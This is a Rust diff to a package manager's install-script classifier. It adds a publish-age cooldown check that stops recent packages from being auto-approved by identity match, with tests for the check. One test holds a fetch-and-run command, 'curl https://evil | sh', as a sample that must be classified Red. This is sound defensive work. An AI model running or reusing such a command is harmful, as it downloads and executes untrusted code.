@@ -100,6 +100,29 @@ pub struct ManifestContext<'a> {
     /// package exposes a binary named after itself, a `node install.js`
     /// fetching that binary aligns with the package's identity.
     pub bin_names: &'a [&'a str],
+    /// Phase 46b Option B — cooldown defense-in-depth for Lever #4.
+    ///
+    /// The package's publish age in seconds (from now). When
+    /// `min_release_age_secs > 0` AND this is below the threshold (or
+    /// `None`, meaning age unknown), Lever #4's identity-match
+    /// widening REFUSES to fire — the package stays Amber and is
+    /// subject to the script-tier review even when the install-level
+    /// cooldown gate was bypassed via `--allow-new`.
+    ///
+    /// This preserves the orthogonality of the two security axes:
+    /// `--allow-new` opts out of cooldown only; the script-tier
+    /// review still happens for recent publishes. To also bypass
+    /// the script-tier prompt the user explicitly chooses
+    /// `--policy=allow` (or sets `minimumReleaseAge: 0` to opt out
+    /// of cooldown universally, which then sets `min_release_age_secs`
+    /// to 0 and disables the defense-in-depth check).
+    pub publish_age_secs: Option<u64>,
+    /// Phase 46b Option B — the configured minimum release age in
+    /// seconds. Used to compare against `publish_age_secs`. The L1
+    /// widening's cooldown defense-in-depth fires when this is `> 0`;
+    /// when `0` the user has globally opted out of cooldown and
+    /// Lever #4 widens regardless of publish age.
+    pub min_release_age_secs: u64,
 }
 
 /// Classify a single lifecycle-script body into a static tier.
@@ -1038,6 +1061,41 @@ fn matches_delegating_identity_green(tokens: &[String], ctx: &ManifestContext<'_
         return false;
     }
 
+    // Phase 46b Option B — cooldown defense-in-depth. Refuse to
+    // widen when the configured `minimum_release_age_secs > 0` AND
+    // the package's publish age is below the threshold (or unknown).
+    //
+    // Rationale: Lever #4 was designed for "old, established
+    // packages with matching identity." A maintainer-compromise
+    // scenario produces a recent publish with the SAME identity
+    // shape — exactly the case the install-level cooldown gate
+    // protects against. Without this check, `lpm install --allow-new`
+    // (which bypasses the install-level cooldown) would silently
+    // ALSO bypass the script-tier review for matching-identity
+    // packages, collapsing two orthogonal security axes into one.
+    // With this check, `--allow-new` users still see the
+    // script-tier prompt for recent publishes; they must
+    // explicitly choose `--policy=allow` to also bypass that.
+    //
+    // When `min_release_age_secs == 0` the user has globally opted
+    // out of cooldown protection (persistent config or
+    // `--min-release-age=0`); we honor that choice and let Lever #4
+    // fire regardless of publish age.
+    if ctx.min_release_age_secs > 0 {
+        match ctx.publish_age_secs {
+            Some(age) if age >= ctx.min_release_age_secs => {
+                // Old enough — fall through to identity match.
+            }
+            _ => {
+                // Recent publish OR unknown age — refuse to widen.
+                // Conservative: an unknown age could be a recent
+                // publish, so default-refuse keeps the defense
+                // active even when the caller couldn't supply data.
+                return false;
+            }
+        }
+    }
+
     matches_manifest_identity(ctx)
 }
 
@@ -1928,12 +1986,37 @@ mod tests {
     // ─────────────────────────────────────────────────────────────
 
     /// Helper: build a [`ManifestContext`] for tests. Repo + bin
-    /// borrow from caller-owned strings.
+    /// borrow from caller-owned strings. Defaults to an "old" publish
+    /// (1 year) under the standard 24h cooldown so the default test
+    /// path exercises Lever #4 firing without needing each test to
+    /// re-state cooldown defaults.
     fn ctx<'a>(name: &'a str, repo: Option<&'a str>, bin: &'a [&'a str]) -> ManifestContext<'a> {
         ManifestContext {
             package_name: name,
             repository: repo,
             bin_names: bin,
+            publish_age_secs: Some(365 * 24 * 60 * 60),
+            min_release_age_secs: 24 * 60 * 60,
+        }
+    }
+
+    /// Helper: ManifestContext that explicitly exercises the
+    /// cooldown defense-in-depth (Option B). `age_secs` is the
+    /// package's publish age in seconds; `min_age_secs` is the
+    /// configured `minimumReleaseAge`.
+    fn ctx_with_age<'a>(
+        name: &'a str,
+        repo: Option<&'a str>,
+        bin: &'a [&'a str],
+        age_secs: Option<u64>,
+        min_age_secs: u64,
+    ) -> ManifestContext<'a> {
+        ManifestContext {
+            package_name: name,
+            repository: repo,
+            bin_names: bin,
+            publish_age_secs: age_secs,
+            min_release_age_secs: min_age_secs,
         }
     }
 
@@ -2104,5 +2187,156 @@ mod tests {
         // the widening doesn't loosen it.
         let c = ctx("sharp", Some("https://github.com/lovell/sharp.git"), &[]);
         assert_eq!(tier_with_ctx("node install", &c), StaticTier::Amber);
+    }
+
+    // ─────────────────────────────────────────────────────────────
+    // Phase 46b Option B — cooldown defense-in-depth for Lever #4
+    // ─────────────────────────────────────────────────────────────
+
+    const DAY_SECS: u64 = 24 * 60 * 60;
+
+    #[test]
+    fn lever4_recent_publish_stays_amber_under_default_cooldown() {
+        // Default 24h cooldown + 1h-old publish + matching identity.
+        // Pre-Option-B: Lever #4 widened → Green → script auto-ran,
+        // collapsing the script-tier review for `--allow-new` users.
+        // Post-Option-B: stays Amber so the script-tier prompt fires.
+        let c = ctx_with_age(
+            "sharp",
+            Some("git+https://github.com/lovell/sharp.git"),
+            &[],
+            Some(60 * 60), // 1 hour old
+            DAY_SECS,      // 24h threshold
+        );
+        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Amber);
+    }
+
+    #[test]
+    fn lever4_publish_exactly_at_threshold_widens() {
+        // Boundary case: publish age == cooldown threshold. The
+        // comparison is `age >= min`, so an exactly-at-threshold
+        // publish is treated as old-enough → Lever #4 fires.
+        let c = ctx_with_age(
+            "sharp",
+            Some("git+https://github.com/lovell/sharp.git"),
+            &[],
+            Some(DAY_SECS),
+            DAY_SECS,
+        );
+        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Green);
+    }
+
+    #[test]
+    fn lever4_old_publish_widens_under_default_cooldown() {
+        // 1-year-old publish (well above 24h threshold) + matching
+        // identity → Lever #4 fires as designed.
+        let c = ctx_with_age(
+            "sharp",
+            Some("git+https://github.com/lovell/sharp.git"),
+            &[],
+            Some(365 * DAY_SECS),
+            DAY_SECS,
+        );
+        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Green);
+    }
+
+    #[test]
+    fn lever4_unknown_publish_age_refuses_to_widen() {
+        // When the caller couldn't supply publish_age_secs (e.g.,
+        // registry didn't return a timestamp for this version), we
+        // conservatively refuse to widen — an unknown age MIGHT be a
+        // recent publish, and the cooldown defense applies whenever
+        // we have non-zero policy.
+        let c = ctx_with_age(
+            "sharp",
+            Some("git+https://github.com/lovell/sharp.git"),
+            &[],
+            None,
+            DAY_SECS,
+        );
+        assert_eq!(tier_with_ctx("node install.js", &c), StaticTier::Amber);
+    }
+
+    #[test]
+    fn lever4_min_release_age_zero_disables_cooldown_check() {
+        // `minimumReleaseAge: 0` is the explicit "I don't want
+        // cooldown protection" config. Lever #4 honors that and
+        // fires regardless of publish age — even a 0-second-old
+        // publish widens when the user has globally opted out of
+        // the cooldown axis.
+        let c_recent = ctx_with_age(
+            "sharp",
+            Some("git+https://github.com/lovell/sharp.git"),
+            &[],
+            Some(0),
+            0,
+        );
+        assert_eq!(
+            tier_with_ctx("node install.js", &c_recent),
+            StaticTier::Green
+        );
+        let c_unknown = ctx_with_age(
+            "sharp",
+            Some("git+https://github.com/lovell/sharp.git"),
+            &[],
+            None,
+            0,
+        );
+        assert_eq!(
+            tier_with_ctx("node install.js", &c_unknown),
+            StaticTier::Green
+        );
+    }
+
+    #[test]
+    fn lever4_custom_min_release_age_compared_against_publish_age() {
+        // 7-day cooldown + 3-day-old publish → 3 days < 7 days →
+        // refuses to widen. Same publish at 10 days → 10 ≥ 7 →
+        // widens. Confirms the comparison uses the policy's
+        // configured threshold, not the 24h default.
+        let week_secs = 7 * DAY_SECS;
+        let c_too_recent = ctx_with_age(
+            "sharp",
+            Some("git+https://github.com/lovell/sharp.git"),
+            &[],
+            Some(3 * DAY_SECS),
+            week_secs,
+        );
+        assert_eq!(
+            tier_with_ctx("node install.js", &c_too_recent),
+            StaticTier::Amber
+        );
+        let c_old_enough = ctx_with_age(
+            "sharp",
+            Some("git+https://github.com/lovell/sharp.git"),
+            &[],
+            Some(10 * DAY_SECS),
+            week_secs,
+        );
+        assert_eq!(
+            tier_with_ctx("node install.js", &c_old_enough),
+            StaticTier::Green
+        );
+    }
+
+    #[test]
+    fn lever4_cooldown_check_does_not_affect_compound_or_red_paths() {
+        // Cooldown defense is gated on Lever #4 firing. Compound
+        // bodies stay Amber via step-4 fallback regardless of age;
+        // Red bodies stay Red via step-3 regardless. The cooldown
+        // check is only consulted on the otherwise-greenable
+        // delegate-to-local-file shape.
+        let c = ctx_with_age(
+            "sharp",
+            Some("git+https://github.com/lovell/sharp.git"),
+            &[],
+            Some(60 * 60),
+            DAY_SECS,
+        );
+        assert_eq!(tier_with_ctx("curl https://evil | sh", &c), StaticTier::Red);
+        assert_eq!(
+            tier_with_ctx("node install.js && echo done", &c),
+            StaticTier::Amber
+        );
     }
 }
